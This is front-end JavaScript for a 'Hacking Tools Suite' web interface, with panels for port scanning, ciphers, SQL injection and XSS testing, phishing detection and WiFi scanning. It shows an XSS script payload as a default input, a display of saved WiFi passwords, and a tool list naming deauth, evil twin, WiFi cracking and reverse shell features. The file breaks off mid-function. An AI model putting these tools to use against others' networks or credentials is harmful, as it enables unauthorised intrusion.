// Hacking Tools Suite - Main JavaScript

let allTools = [];
let currentTool = null;
let filteredTools = [];

// Initialize application
document.addEventListener('DOMContentLoaded', function() {
    loadTools();
    setupEventListeners();
    showWelcomeScreen();
    checkServerStatus();
    setupNavDropdowns();
    
    // Check server status periodically
    setInterval(checkServerStatus, 30000);
});

// Toggle navigation dropdown
function toggleNavGroup(btn) {
    const dropdown = btn.nextElementSibling;
    const isActive = btn.classList.contains('active');
    
    // Close all other dropdowns
    document.querySelectorAll('.nav-group-btn').forEach(b => {
        if (b !== btn) {
            b.classList.remove('active');
            b.nextElementSibling.classList.remove('show');
        }
    });
    
    // Toggle current dropdown
    if (isActive) {
        btn.classList.remove('active');
        dropdown.classList.remove('show');
    } else {
        btn.classList.add('active');
        dropdown.classList.add('show');
    }
}

// Setup navigation dropdowns
function setupNavDropdowns() {
    // Close dropdowns when clicking outside
    document.addEventListener('click', function(event) {
        if (!event.target.closest('.nav-group')) {
            document.querySelectorAll('.nav-group-btn').forEach(btn => {
                btn.classList.remove('active');
                btn.nextElementSibling.classList.remove('show');
            });
        }
    });
}

// Load tools from API
async function loadTools() {
    try {
        const response = await fetch('/api/tools');
        allTools = await response.json();
    } catch (error) {
        console.error('Error loading tools:', error);
        showError('Failed to load tools');
    }
}

// Render tool list in sidebar
function renderToolList(tools) {
    filteredTools = tools;
    const toolList = document.getElementById('tool-list');
    toolList.innerHTML = '';
    
    if (tools.length === 0) {
        toolList.innerHTML = '<div style="padding: 20px; text-align: center; color: var(--text-muted);">No tools found</div>';
        return;
    }
    
    tools.forEach(tool => {
        const toolItem = document.createElement('div');
        toolItem.className = 'tool-item';
        toolItem.id = `tool-${tool.id}`;
        const iconHtml = tool.icon ? `<span class="tool-item-icon">${tool.icon}</span>` : '';
        toolItem.innerHTML = `
            <div class="tool-item-name">${tool.name}</div>
            <div class="tool-item-desc">${tool.description}</div>
        `;
        toolItem.onclick = (e) => {
            e.stopPropagation();
            showTool(tool, toolItem);
        };
        toolList.appendChild(toolItem);
    });
}

// Filter tools by search query
function filterTools() {
    const searchInput = document.getElementById('tool-search');
    const query = searchInput.value.toLowerCase().trim();
    
    if (!query) {
        // If no query, show tools based on active category filter
        const activeCategory = document.querySelector('.nav-btn.active')?.getAttribute('data-category') || 'all';
        if (activeCategory === 'all') {
            renderToolList(allTools);
        } else {
            const filtered = allTools.filter(t => t.category === activeCategory);
            renderToolList(filtered);
        }
        return;
    }
    
    const filtered = allTools.filter(tool => 
        tool.name.toLowerCase().includes(query) ||
        tool.description.toLowerCase().includes(query) ||
        tool.category.toLowerCase().includes(query)
    );
    
    renderToolList(filtered);
}

// Show tool by ID (for welcome screen cards)
function showToolById(toolId) {
    const tool = allTools.find(t => t.id === toolId);
    if (tool) {
        const toolItem = document.getElementById(`tool-${toolId}`);
        showTool(tool, toolItem);
    }
}

// Check server status
async function checkServerStatus() {
    try {
        const response = await fetch('/api/health');
        if (response.ok) {
            const statusIndicator = document.getElementById('status-indicator');
            const statusText = document.getElementById('status-text');
            if (statusIndicator && statusText) {
                statusIndicator.className = 'status-indicator online';
                statusText.textContent = 'Online';
            }
        } else {
            throw new Error('Server not responding');
        }
    } catch (error) {
        const statusIndicator = document.getElementById('status-indicator');
        const statusText = document.getElementById('status-text');
        if (statusIndicator && statusText) {
            statusIndicator.className = 'status-indicator offline';
            statusText.textContent = 'Offline';
        }
    }
}

// Show selected tool
function showTool(tool, toolItem) {
    if (!tool || !tool.id) {
        console.error('Invalid tool:', tool);
        return;
    }
    
    currentTool = tool;
    
    // Close all navigation dropdowns
    document.querySelectorAll('.nav-group-btn').forEach(btn => {
        btn.classList.remove('active');
        btn.nextElementSibling.classList.remove('show');
    });
    
    // Hide welcome screen
    const welcomeScreen = document.getElementById('welcome-screen');
    if (welcomeScreen) {
        welcomeScreen.classList.remove('active');
        welcomeScreen.style.display = 'none';
    }
    
    // Show tool panel
    showToolPanel(tool.id);
}

// Show tool panel
function showToolPanel(toolId) {
    const toolPanels = document.getElementById('tool-panels');
    let panel = document.getElementById(`panel-${toolId}`);
    
    if (!panel) {
        panel = createToolPanel(toolId);
        toolPanels.appendChild(panel);
    }
    
    // Hide welcome screen
    const welcomeScreen = document.getElementById('welcome-screen');
    if (welcomeScreen) {
        welcomeScreen.classList.remove('active');
        welcomeScreen.style.display = 'none';
    }
    
    // Hide all panels
    document.querySelectorAll('[id^="panel-"]').forEach(p => {
        p.classList.remove('active');
        p.style.display = 'none';
    });
    
    // Show selected panel
    panel.classList.add('active');
    panel.style.display = 'block';
}

// Create tool panel based on tool type
function createToolPanel(toolId) {
    const panel = document.createElement('div');
    panel.id = `panel-${toolId}`;
    panel.className = 'panel-content';
    
    const tool = allTools.find(t => t.id === toolId);
    
    let content = '';
    
    switch(toolId) {
        case 'port_scanner':
            content = createPortScannerPanel();
            break;
        case 'caesar_cipher':
            content = createCaesarCipherPanel();
            break;
        case 'vigenere_cipher':
            content = createVigenereCipherPanel();
            break;
        case 'base64_cipher':
            content = createBase64CipherPanel();
            break;
        case 'hash_tools':
            content = createHashToolsPanel();
            break;
        case 'sql_injection':
            content = createSQLInjectionPanel();
            break;
        case 'xss_tester':
            content = createXSSPanel();
            break;
        case 'password_strength':
            content = createPasswordStrengthPanel();
            break;
        case 'phishing_detector':
            content = createPhishingDetectorPanel();
            break;
        case 'wifi_scanner':
            content = createWiFiScannerPanel();
            break;
        case 'wifi_security':
            content = createWiFiSecurityPanel();
            break;
        case 'channel_analyzer':
            content = createChannelAnalyzerPanel();
            break;
        case 'wifi_connection_analyzer':
            content = createConnectionAnalyzerPanel();
            break;
        case 'wifi_password_analyzer':
            content = createPasswordAnalyzerPanel();
            break;
        case 'wifi_security_test':
            content = createSecurityTestPanel();
            break;
        case 'network_mapping':
            content = createNetworkMappingPanel();
            break;
        case 'deauth_attack':
            content = createDeauthAttackPanel();
            break;
        case 'wpa_handshake_capturer':
            content = createWPAHandshakeCapturerPanel();
            break;
        case 'wifi_password_cracker':
            content = createWiFiPasswordCrackerPanel();
            break;
        case 'evil_twin':
            content = createEvilTwinPanel();
            break;
        case 'exploit_framework':
            content = createExploitFrameworkPanel();
            break;
        case 'payload_generator':
            content = createPayloadGeneratorPanel();
            break;
        case 'reverse_shell':
            content = createReverseShellPanel();
            break;
        case 'subdomain_scanner':
            content = createSubdomainScannerPanel();
            break;
        case 'dns_enumeration':
            content = createDNSEnumerationPanel();
            break;
        case 'whois_lookup':
            content = createWhoisLookupPanel();
            break;
        case 'image_steganography':
            content = createImageSteganographyPanel();
            break;
        case 'text_steganography':
            content = createTextSteganographyPanel();
            break;
        default:
            content = '<p>Tool not found</p>';
    }
    
    panel.innerHTML = content;
    return panel;
}

// Port Scanner Panel
function createPortScannerPanel() {
    return `
        <h2>[NET] Port Scanner</h2>
        <div class="tool-form">
            <div class="form-group">
                <label>Target Host</label>
                <input type="text" id="ps-target" placeholder="localhost, 192.168.1.1, example.com" value="localhost">
            </div>
            <div class="form-row">
                <div class="form-group">
                    <label>Port Range</label>
                    <input type="text" id="ps-ports" placeholder="1-1000" value="1-1000">
                </div>
                <div class="form-group">
                    <label>Timeout (seconds)</label>
                    <input type="number" id="ps-timeout" value="1" min="0.1" step="0.1">
                </div>
            </div>
            <div class="form-group">
                <label>Threads</label>
                <input type="number" id="ps-threads" value="50" min="1" max="500">
            </div>
            <button class="btn" onclick="scanPorts()">Scan Ports</button>
        </div>
        <div id="ps-results"></div>
    `;
}

// Caesar Cipher Panel
function createCaesarCipherPanel() {
    return `
        <h2>[CRYPTO] Caesar Cipher</h2>
        <div class="tool-form">
            <div class="form-group">
                <label>Text</label>
                <textarea id="cc-text" placeholder="Enter text to encrypt/decrypt">HELLO WORLD</textarea>
            </div>
            <div class="form-row">
                <div class="form-group">
                    <label>Shift Value</label>
                    <input type="number" id="cc-shift" value="3" min="0" max="25">
                </div>
                <div class="form-group">
                    <label>Mode</label>
                    <select id="cc-mode">
                        <option value="encrypt">Encrypt</option>
                        <option value="decrypt">Decrypt</option>
                        <option value="brute_force">Brute Force</option>
                    </select>
                </div>
            </div>
            <button class="btn" onclick="caesarCipher()">Process</button>
        </div>
        <div id="cc-results"></div>
    `;
}

// Vigenère Cipher Panel
function createVigenereCipherPanel() {
    return `
        <h2>[CRYPTO] Vigenère Cipher</h2>
        <div class="tool-form">
            <div class="form-group">
                <label>Text</label>
                <textarea id="vc-text" placeholder="Enter text">HELLO WORLD</textarea>
            </div>
            <div class="form-group">
                <label>Key</label>
                <input type="text" id="vc-key" placeholder="Enter encryption key" value="SECRET">
            </div>
            <div class="form-group">
                <label>Mode</label>
                <select id="vc-mode">
                    <option value="encrypt">Encrypt</option>
                    <option value="decrypt">Decrypt</option>
                </select>
            </div>
            <button class="btn" onclick="vigenereCipher()">Process</button>
        </div>
        <div id="vc-results"></div>
    `;
}

// Base64 Cipher Panel
function createBase64CipherPanel() {
    return `
        <h2>[CRYPTO] Base64 Encoder/Decoder</h2>
        <div class="tool-form">
            <div class="form-group">
                <label>Text</label>
                <textarea id="b64-text" placeholder="Enter text">HELLO WORLD</textarea>
            </div>
            <div class="form-group">
                <label>Mode</label>
                <select id="b64-mode">
                    <option value="encode">Encode</option>
                    <option value="decode">Decode</option>
                </select>
            </div>
            <button class="btn" onclick="base64Cipher()">Process</button>
        </div>
        <div id="b64-results"></div>
    `;
}

// Hash Tools Panel
function createHashToolsPanel() {
    return `
        <h2>[CRYPTO] Hash Generator</h2>
        <div class="tool-form">
            <div class="form-group">
                <label>Text to Hash</label>
                <textarea id="hash-text" placeholder="Enter text">password123</textarea>
            </div>
            <div class="form-group">
                <label>Algorithm</label>
                <select id="hash-algorithm">
                    <option value="md5">MD5</option>
                    <option value="sha1">SHA1</option>
                    <option value="sha256" selected>SHA256</option>
                    <option value="sha512">SHA512</option>
                </select>
            </div>
            <button class="btn" onclick="generateHash()">Generate Hash</button>
        </div>
        <div id="hash-results"></div>
    `;
}

// SQL Injection Panel
function createSQLInjectionPanel() {
    return `
        <h2>[WEB] SQL Injection Tester</h2>
        <div class="tool-form">
            <div class="form-group">
                <label>Test Input</label>
                <textarea id="sqli-input" placeholder="Enter input to test" rows="4">username</textarea>
            </div>
            <button class="btn" onclick="testSQLInjection()">Test for SQL Injection</button>
        </div>
        <div id="sqli-results"></div>
    `;
}

// XSS Panel
function createXSSPanel() {
    return `
        <h2>[WEB] XSS Vulnerability Tester</h2>
        <div class="tool-form">
            <div class="form-group">
                <label>Test Input</label>
                <textarea id="xss-input" placeholder="Enter input to test" rows="4"><script>alert('XSS')</script></textarea>
            </div>
            <button class="btn" onclick="testXSS()">Test for XSS</button>
        </div>
        <div id="xss-results"></div>
    `;
}

// Password Strength Panel
function createPasswordStrengthPanel() {
    return `
        <h2>[PWD] Password Strength Analyzer</h2>
        <div class="tool-form">
            <div class="form-group">
                <label>Password</label>
                <input type="password" id="pwd-input" placeholder="Enter password" value="MyP@ssw0rd!">
            </div>
            <button class="btn" onclick="checkPasswordStrength()">Analyze Password</button>
        </div>
        <div id="pwd-results"></div>
    `;
}

// Phishing Detector Panel
function createPhishingDetectorPanel() {
    return `
        <h2>[SOC] Phishing Detector</h2>
        <div class="tool-form">
            <div class="form-group">
                <label>Analysis Type</label>
                <select id="phishing-type" onchange="updatePhishingForm()">
                    <option value="email">Email Analysis</option>
                    <option value="url">URL Analysis</option>
                </select>
            </div>
            
            <div id="email-form">
                <div class="form-group">
                    <label>Sender Email</label>
                    <input type="text" id="phishing-sender" placeholder="sender@example.com">
                </div>
                <div class="form-group">
                    <label>Subject</label>
                    <input type="text" id="phishing-subject" placeholder="Email subject">
                </div>
                <div class="form-group">
                    <label>Email Body</label>
                    <textarea id="phishing-body" placeholder="Email content" rows="4"></textarea>
                </div>
                <button class="btn" onclick="analyzePhishingEmail()">Analyze Email</button>
            </div>
            
            <div id="url-form" style="display:none;">
                <div class="form-group">
                    <label>URL</label>
                    <input type="text" id="phishing-url" placeholder="https://example.com">
                </div>
                <button class="btn" onclick="analyzePhishingURL()">Analyze URL</button>
            </div>
        </div>
        <div id="phishing-results"></div>
    `;
}

// API Call Functions

async function scanPorts() {
    const target = document.getElementById('ps-target').value;
    const ports = document.getElementById('ps-ports').value;
    const timeout = document.getElementById('ps-timeout').value;
    const threads = document.getElementById('ps-threads').value;
    const resultsDiv = document.getElementById('ps-results');
    
    if (!target || !ports) {
        showError('Please fill in all fields', resultsDiv);
        return;
    }
    
    showLoading(resultsDiv);
    
    try {
        const response = await fetch('/api/scan/port', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ target, ports, timeout, threads })
        });
        
        const data = await response.json();
        
        if (response.ok) {
            let html = '<div class="results"><h3>Scan Results</h3>';
            html += `<div class="result-row"><span class="result-label">Target:</span><span class="result-value">${data.target}</span></div>`;
            html += `<div class="result-row"><span class="result-label">Open Ports:</span><span class="result-value">${data.open_count}/${data.total_ports_scanned}</span></div>`;
            
            if (data.open_ports.length > 0) {
                html += '<div class="result-box success"><div class="result-title">Open Ports:</div>';
                data.open_ports.forEach(port => {
                    html += `<div class="list-item">${port[0]} - ${port[1]}</div>`;
                });
                html += '</div>';
            } else {
                html += '<div class="result-box"><div class="result-title">No open ports found</div></div>';
            }
            
            html += '</div>';
            resultsDiv.innerHTML = html;
        } else {
            showError(data.error || 'Error scanning ports', resultsDiv);
        }
    } catch (error) {
        showError('Failed to scan ports: ' + error.message, resultsDiv);
    }
}

async function caesarCipher() {
    const text = document.getElementById('cc-text').value;
    const shift = document.getElementById('cc-shift').value;
    const mode = document.getElementById('cc-mode').value;
    const resultsDiv = document.getElementById('cc-results');
    
    if (!text) {
        showError('Please enter text', resultsDiv);
        return;
    }
    
    showLoading(resultsDiv);
    
    try {
        const response = await fetch('/api/crypto/caesar', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ text, shift, mode })
        });
        
        const data = await response.json();
        
        if (response.ok) {
            let html = '<div class="results">';
            
            if (mode === 'brute_force') {
                html += '<h3>Brute Force Results (All 26 Shifts):</h3>';
                html += '<div class="result-box">';
                for (let i = 0; i < 26; i++) {
                    if (data.results[i]) {
                        html += `<div class="result-row"><span class="result-label">Shift ${i}:</span><span class="result-value">${data.results[i]}</span></div>`;
                    }
                }
                html += '</div>';
            } else {
                html += `<div class="result-box success">`;
                html += `<div class="result-row"><span class="result-label">Mode:</span><span class="result-value">${mode}</span></div>`;
                html += `<div class="result-row"><span class="result-label">Shift:</span><span class="result-value">${data.shift}</span></div>`;
                html += `<div class="result-row"><span class="result-label">Result:</span><span class="result-value">${data.result}</span></div>`;
                html += '</div>';
            }
            
            html += '</div>';
            resultsDiv.innerHTML = html;
        } else {
            showError(data.error, resultsDiv);
        }
    } catch (error) {
        showError('Error: ' + error.message, resultsDiv);
    }
}

async function vigenereCipher() {
    const text = document.getElementById('vc-text').value;
    const key = document.getElementById('vc-key').value;
    const mode = document.getElementById('vc-mode').value;
    const resultsDiv = document.getElementById('vc-results');
    
    if (!text || !key) {
        showError('Please enter text and key', resultsDiv);
        return;
    }
    
    showLoading(resultsDiv);
    
    try {
        const response = await fetch('/api/crypto/vigenere', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ text, key, mode })
        });
        
        const data = await response.json();
        
        if (response.ok) {
            let html = '<div class="results"><div class="result-box success">';
            html += `<div class="result-row"><span class="result-label">Mode:</span><span class="result-value">${mode}</span></div>`;
            html += `<div class="result-row"><span class="result-label">Key:</span><span class="result-value">${key}</span></div>`;
            html += `<div class="result-row"><span class="result-label">Result:</span><span class="result-value">${data.result}</span></div>`;
            html += '</div></div>';
            resultsDiv.innerHTML = html;
        } else {
            showError(data.error, resultsDiv);
        }
    } catch (error) {
        showError('Error: ' + error.message, resultsDiv);
    }
}

async function base64Cipher() {
    const text = document.getElementById('b64-text').value;
    const mode = document.getElementById('b64-mode').value;
    const resultsDiv = document.getElementById('b64-results');
    
    if (!text) {
        showError('Please enter text', resultsDiv);
        return;
    }
    
    showLoading(resultsDiv);
    
    try {
        const response = await fetch('/api/crypto/base64', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ text, mode })
        });
        
        const data = await response.json();
        
        if (response.ok) {
            let html = '<div class="results"><div class="result-box success">';
            html += `<div class="result-row"><span class="result-label">Mode:</span><span class="result-value">${mode}</span></div>`;
            html += `<div class="result-row"><span class="result-label">Result:</span><span class="result-value">${data.result}</span></div>`;
            html += '</div></div>';
            resultsDiv.innerHTML = html;
        } else {
            showError(data.error, resultsDiv);
        }
    } catch (error) {
        showError('Error: ' + error.message, resultsDiv);
    }
}

async function generateHash() {
    const text = document.getElementById('hash-text').value;
    const algorithm = document.getElementById('hash-algorithm').value;
    const resultsDiv = document.getElementById('hash-results');
    
    if (!text) {
        showError('Please enter text', resultsDiv);
        return;
    }
    
    showLoading(resultsDiv);
    
    try {
        const response = await fetch('/api/crypto/hash', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ text, algorithm })
        });
        
        const data = await response.json();
        
        if (response.ok) {
            let html = '<div class="results"><div class="result-box success">';
            html += `<div class="result-row"><span class="result-label">Algorithm:</span><span class="result-value">${data.algorithm.toUpperCase()}</span></div>`;
            html += `<div class="result-row"><span class="result-label">Hash:</span><span class="result-value" style="font-family: monospace;">${data.result}</span></div>`;
            html += '</div></div>';
            resultsDiv.innerHTML = html;
        } else {
            showError(data.error, resultsDiv);
        }
    } catch (error) {
        showError('Error: ' + error.message, resultsDiv);
    }
}

async function testSQLInjection() {
    const input = document.getElementById('sqli-input').value;
    const resultsDiv = document.getElementById('sqli-results');
    
    if (!input) {
        showError('Please enter input', resultsDiv);
        return;
    }
    
    showLoading(resultsDiv);
    
    try {
        const response = await fetch('/api/security/sql-injection', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ input })
        });
        
        const data = await response.json();
        
        if (response.ok) {
            let html = '<div class="results">';
            html += `<div class="result-box ${data.vulnerable ? 'error' : 'success'}">`;
            html += `<div class="result-title">${data.vulnerable ? '⚠️ VULNERABLE' : '✓ SAFE'}</div>`;
            html += `<div class="result-row"><span class="result-label">Input:</span><span class="result-value">${data.input}</span></div>`;
            
            if (data.patterns.length > 0) {
                html += '<div class="list-item error">Detected Patterns:<br>';
                data.patterns.forEach(p => html += `• ${p}<br>`);
                html += '</div>';
            }
            
            html += `<div class="result-row"><span class="result-label">Sanitized:</span><span class="result-value">${data.sanitized}</span></div>`;
            html += `<div class="result-row"><span class="result-label">Escaped:</span><span class="result-value">${data.escaped}</span></div>`;
            html += '</div></div>';
            resultsDiv.innerHTML = html;
        } else {
            showError(data.error, resultsDiv);
        }
    } catch (error) {
        showError('Error: ' + error.message, resultsDiv);
    }
}

async function testXSS() {
    const input = document.getElementById('xss-input').value;
    const resultsDiv = document.getElementById('xss-results');
    
    if (!input) {
        showError('Please enter input', resultsDiv);
        return;
    }
    
    showLoading(resultsDiv);
    
    try {
        const response = await fetch('/api/security/xss', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ input })
        });
        
        const data = await response.json();
        
        if (response.ok) {
            let html = '<div class="results">';
            html += `<div class="result-box ${data.vulnerable ? 'error' : 'success'}">`;
            html += `<div class="result-title">${data.vulnerable ? '⚠️ VULNERABLE' : '✓ SAFE'}</div>`;
            html += `<div class="result-row"><span class="result-label">Input:</span><span class="result-value">${data.input}</span></div>`;
            
            if (data.patterns.length > 0) {
                html += '<div class="list-item error">Detected Patterns:<br>';
                data.patterns.forEach(p => html += `• ${p}<br>`);
                html += '</div>';
            }
            
            html += `<div class="result-row"><span class="result-label">Sanitized:</span><span class="result-value">${data.sanitized}</span></div>`;
            html += `<div class="result-row"><span class="result-label">HTML Encoded:</span><span class="result-value">${data.html_encoded}</span></div>`;
            html += '</div></div>';
            resultsDiv.innerHTML = html;
        } else {
            showError(data.error, resultsDiv);
        }
    } catch (error) {
        showError('Error: ' + error.message, resultsDiv);
    }
}

async function checkPasswordStrength() {
    const password = document.getElementById('pwd-input').value;
    const resultsDiv = document.getElementById('pwd-results');
    
    if (!password) {
        showError('Please enter a password', resultsDiv);
        return;
    }
    
    showLoading(resultsDiv);
    
    try {
        const response = await fetch('/api/password/strength', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ password })
        });
        
        const data = await response.json();
        
        if (response.ok) {
            let strengthClass = 'success';
            if (data.strength === 'Weak' || data.strength === 'Very Weak') {
                strengthClass = 'error';
            } else if (data.strength === 'Fair') {
                strengthClass = 'warning';
            }
            
            let html = '<div class="results">';
            html += `<div class="result-box ${strengthClass}">`;
            html += `<div class="result-title">Strength: ${data.strength} (Score: ${data.score}/7)</div>`;
            html += `<div class="result-row"><span class="result-label">Length:</span><span class="result-value">${data.length}</span></div>`;
            html += `<div class="result-row"><span class="result-label">Entropy:</span><span class="result-value">${data.entropy} bits</span></div>`;
            
            if (data.feedback.length > 0) {
                html += '<div class="list-item warning">Feedback:<br>';
                data.feedback.forEach(f => html += `• ${f}<br>`);
                html += '</div>';
            }
            
            html += '</div></div>';
            resultsDiv.innerHTML = html;
        } else {
            showError(data.error, resultsDiv);
        }
    } catch (error) {
        showError('Error: ' + error.message, resultsDiv);
    }
}

function updatePhishingForm() {
    const type = document.getElementById('phishing-type').value;
    document.getElementById('email-form').style.display = type === 'email' ? 'block' : 'none';
    document.getElementById('url-form').style.display = type === 'url' ? 'block' : 'none';
}

async function analyzePhishingEmail() {
    const sender = document.getElementById('phishing-sender').value;
    const subject = document.getElementById('phishing-subject').value;
    const body = document.getElementById('phishing-body').value;
    const resultsDiv = document.getElementById('phishing-results');
    
    if (!sender || !subject || !body) {
        showError('Please fill in all fields', resultsDiv);
        return;
    }
    
    showLoading(resultsDiv);
    
    try {
        const response = await fetch('/api/phishing/analyze-email', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ sender, subject, body })
        });
        
        const data = await response.json();
        
        if (response.ok) {
            let riskClass = 'success';
            if (data.risk_level === 'Critical') riskClass = 'error';
            else if (data.risk_level === 'High') riskClass = 'warning';
            
            let html = '<div class="results">';
            html += `<div class="result-box ${riskClass}">`;
            html += `<div class="result-title">Risk Level: ${data.risk_level} (${data.risk_score}/10)</div>`;
            html += `<div class="result-row"><span class="result-label">Sender:</span><span class="result-value">${data.sender}</span></div>`;
            
            if (data.red_flags.length > 0) {
                html += '<div class="list-item error">Red Flags:<br>';
                data.red_flags.forEach(f => html += `• ${f}<br>`);
                html += '</div>';
            }
            
            html += '</div></div>';
            resultsDiv.innerHTML = html;
        } else {
            showError(data.error, resultsDiv);
        }
    } catch (error) {
        showError('Error: ' + error.message, resultsDiv);
    }
}

async function analyzePhishingURL() {
    const url = document.getElementById('phishing-url').value;
    const resultsDiv = document.getElementById('phishing-results');
    
    if (!url) {
        showError('Please enter a URL', resultsDiv);
        return;
    }
    
    showLoading(resultsDiv);
    
    try {
        const response = await fetch('/api/phishing/analyze-url', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ url })
        });
        
        const data = await response.json();
        
        if (response.ok) {
            let riskClass = 'success';
            if (data.risk_level === 'Critical') riskClass = 'error';
            else if (data.risk_level === 'High') riskClass = 'warning';
            
            let html = '<div class="results">';
            html += `<div class="result-box ${riskClass}">`;
            html += `<div class="result-title">Risk Level: ${data.risk_level} (${data.risk_score}/10)</div>`;
            html += `<div class="result-row"><span class="result-label">URL:</span><span class="result-value">${data.url}</span></div>`;
            
            if (data.red_flags.length > 0) {
                html += '<div class="list-item error">Red Flags:<br>';
                data.red_flags.forEach(f => html += `• ${f}<br>`);
                html += '</div>';
            }
            
            html += '</div></div>';
            resultsDiv.innerHTML = html;
        } else {
            showError(data.error, resultsDiv);
        }
    } catch (error) {
        showError('Error: ' + error.message, resultsDiv);
    }
}

// Utility Functions

function showWelcomeScreen() {
    const welcomeScreen = document.getElementById('welcome-screen');
    if (welcomeScreen) {
        welcomeScreen.classList.add('active');
        welcomeScreen.style.display = 'flex';
    }
    // Hide all tool panels
    document.querySelectorAll('[id^="panel-"]').forEach(p => {
        p.classList.remove('active');
        p.style.display = 'none';
    });
}

function showLoading(resultsDiv, message = 'Processing...') {
    if (typeof resultsDiv === 'string') {
        resultsDiv = document.getElementById(resultsDiv);
    }
    if (resultsDiv) {
        resultsDiv.innerHTML = `
            <div class="loading" style="text-align: center; padding: 40px;">
                <div class="spinner" style="display: inline-block;"></div>
                <p style="margin-top: 15px; color: #48bb78; font-weight: 600;">${message}</p>
            </div>
        `;
    }
}

function showError(message, resultsDiv) {
    if (typeof resultsDiv === 'string') {
        resultsDiv = document.getElementById(resultsDiv);
    }
    if (resultsDiv) {
        resultsDiv.innerHTML = `
            <div class="result-box" style="border-left-color: var(--danger-color); padding: 20px; margin: 20px 0;">
                <div style="color: var(--danger-color); font-weight: 600; margin-bottom: 10px;">Error</div>
                <div style="color: #fca5a5;">${message}</div>
            </div>
        `;
    }
}

function setupEventListeners() {
    // Navigation dropdowns are handled by toggleNavGroup function
}

async function showSecurityTips() {
    try {
        const response = await fetch('/api/security/tips');
        const data = await response.json();
        
        const tipsList = document.getElementById('tips-list');
        tipsList.innerHTML = '<ol>' + data.tips.map(tip => `<li>${tip}</li>`).join('') + '</ol>';
        
        document.getElementById('tips-modal').classList.add('show');
    } catch (error) {
        alert('Error loading tips: ' + error.message);
    }
}

function closeTipsModal() {
    document.getElementById('tips-modal').classList.remove('show');
}

function closeAboutModal() {
    document.getElementById('about-modal').classList.remove('show');
}

function showAbout() {
    document.getElementById('about-modal').classList.add('show');
}

// WiFi Scanner Panel
function createWiFiScannerPanel() {
    return `
        <div class="tool-panel">
            <h2>[WIFI] WiFi Network Scanner</h2>
            <p class="tool-description">Scan for available WiFi networks in your area</p>
            
            <button class="btn btn-primary" onclick="scanWiFiNetworks()" style="margin: 20px 0;">
                Scan Networks
            </button>
            
            <div id="wifi-scan-results" style="margin-top: 20px;"></div>
        </div>
    `;
}

async function scanWiFiNetworks() {
    try {
        showLoading('wifi-scan-results', 'Scanning networks...');
        
        const response = await fetch('/api/wifi/scan');
        const data = await response.json();
        
        const resultsDiv = document.getElementById('wifi-scan-results');
        
        if (data.error) {
            resultsDiv.innerHTML = `<div class="result-error">Error: ${data.error}</div>`;
            return;
        }
        
        let html = `
            <div class="result-box">
                <h3>Current Connection</h3>
                <div class="info-grid">
                    <div class="info-item">
                        <span class="label">Network:</span>
                        <span class="value">${data.current_network.ssid}</span>
                    </div>
                    <div class="info-item">
                        <span class="label">Signal:</span>
                        <span class="value">${data.current_network.signal}%</span>
                    </div>
                    <div class="info-item">
                        <span class="label">Auth:</span>
                        <span class="value">${data.current_network.authentication}</span>
                    </div>
                    ${data.current_network.password ? `
                    <div class="info-item" style="grid-column: 1 / -1; background: rgba(0, 255, 65, 0.1); padding: 12px; border-radius: 5px; border: 1px solid var(--accent-color);">
                        <span class="label" style="color: var(--accent-color);">Password:</span>
                        <span class="value" style="font-family: 'JetBrains Mono', monospace; color: var(--accent-color); font-weight: 700; font-size: 16px;">${data.current_network.password}</span>
                    </div>
                    ` : ''}
                </div>
            </div>
            
            <div class="result-box">
                <h3>Available Networks (${data.total_networks})</h3>
        `;
        
        data.networks.forEach(net => {
            html += `
                <div class="network-item">
                    <div style="display: flex; justify-content: space-between; align-items: center;">
                        <strong>${net.ssid}</strong>
                        <span class="signal-bar">
                            ${'▓'.repeat(Math.ceil(net.signal / 20))}${'░'.repeat(5 - Math.ceil(net.signal / 20))}
                        </span>
                    </div>
                    <small>${net.signal_strength} (${net.signal}%)</small>
                    ${net.password ? `
                    <div style="margin-top: 8px; padding: 8px; background: rgba(0, 255, 65, 0.1); border-radius: 4px; border-left: 2px solid var(--accent-color);">
                        <span style="color: var(--accent-color); font-size: 11px; font-weight: 600;">PASSWORD: </span>
                        <span style="font-family: 'JetBrains Mono', monospace; color: var(--accent-color); font-weight: 700;">${net.password}</span>
                    </div>
                    ` : '<div style="margin-top: 4px; color: var(--text-dim); font-size: 11px;">No saved password</div>'}
                </div>
            `;
        });
        
        html += '</div>';
        resultsDiv.innerHTML = html;
        
    } catch (error) {
        showError('wifi-scan-results', 'Failed to scan networks: ' + error.message);
    }
}

// WiFi Security Analyzer Panel
function createWiFiSecurityPanel() {
    return `
        <div class="tool-panel">
            <h2>[WIFI] WiFi Security Analyzer</h2>
            <p class="tool-description">Analyze WiFi network security configuration</p>
            
            <div class="form-group">
                <label>Network SSID:</label>
                <input type="text" id="wifi-ssid" placeholder="Enter network name" value="HomeNetwork">
            </div>
            
            <div class="form-group">
                <label>Authentication Type:</label>
                <select id="wifi-auth">
                    <option value="Open">Open (No Encryption)</option>
                    <option value="WEP">WEP</option>
                    <option value="WPA">WPA</option>
                    <option value="WPA2" selected>WPA2</option>
                    <option value="WPA3">WPA3</option>
                </select>
            </div>
            
            <div class="form-group">
                <label>Password (Optional):</label>
                <input type="password" id="wifi-password" placeholder="Enter WiFi password">
            </div>
            
            <button class="btn btn-primary" onclick="analyzeWiFiSecurity()">Analyze Security</button>
            
            <div id="security-analysis-results" style="margin-top: 20px;"></div>
        </div>
    `;
}

async function analyzeWiFiSecurity() {
    try {
        const ssid = document.getElementById('wifi-ssid').value;
        const auth = document.getElementById('wifi-auth').value;
        const password = document.getElementById('wifi-password').value;
        
        if (!ssid) {
            showError('security-analysis-results', 'Please enter network SSID');
            return;
        }
        
        showLoading('security-analysis-results', 'Analyzing...');
        
        const response = await fetch('/api/wifi/security-analysis', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
